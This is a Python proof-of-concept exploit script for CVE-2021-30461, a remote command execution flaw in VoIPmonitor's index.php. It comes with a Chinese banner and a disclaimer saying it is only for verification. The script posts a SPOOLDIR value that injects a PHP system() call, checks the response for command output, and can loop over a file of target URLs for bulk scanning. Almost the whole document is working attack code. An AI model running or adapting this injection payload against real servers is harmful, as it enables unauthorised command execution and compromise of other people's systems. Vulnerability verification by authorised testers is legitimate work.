#!/usr/bin/python
#coding=GBK
import  requests
from argparse import ArgumentParser
def info():
    '''
        CVE-2021-30461  poc
    :return:
    '''
    print("-------------------------------------------------")
    print("VoIPmonitor 远程命令执行验证poc                    |")
    print("author:木鱼                                      |")
    print("该脚本仅用于验证漏洞存在，不可用于任何违法用途！          |")
    print("-------------------------------------------------")


def poc(url):
    proxys = {'http':'http://127.0.0.1:8080','https':'socks5://127.0.0.1:10808'}
    headers={
        'user-agent':'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36',
    }
    url = url + "index.php"
    #SPOOLDIR=test%22.system%28id%29.%22&recheck=annen
    post = {
        'SPOOLDIR':'test".system(id)."',
        'recheck' :'annen',


    }
    resp = requests.post(url, proxies=proxys, headers=headers,data=post, verify=False)

    if "uid=" in resp.text:

        findword = "<html>"
        len  = resp.text.find(findword)
        print(resp.text[:len])


        print(url+"存在rce漏洞")

    else:
        print(url+"不存在rce漏洞")





if __name__ == '__main__':

    info()
    group =ArgumentParser()
    group.add_argument('-u','--url',type=str,help="input url")
    group.add_argument('-f','--File',type=str,help="input file")
    args = group.parse_args()
    if args.url:
        url = args.url
        poc(url)
    elif args.File:
        filename = args.File
        print(filename)
        with open(filename,'r')as e:
            files = e.readlines()
            for file in files:
                if not (file.startswith("http") or file.startswith("https")):
                    file = "http://"+file
                    poc(file.strip())
                else:
                    poc(file)









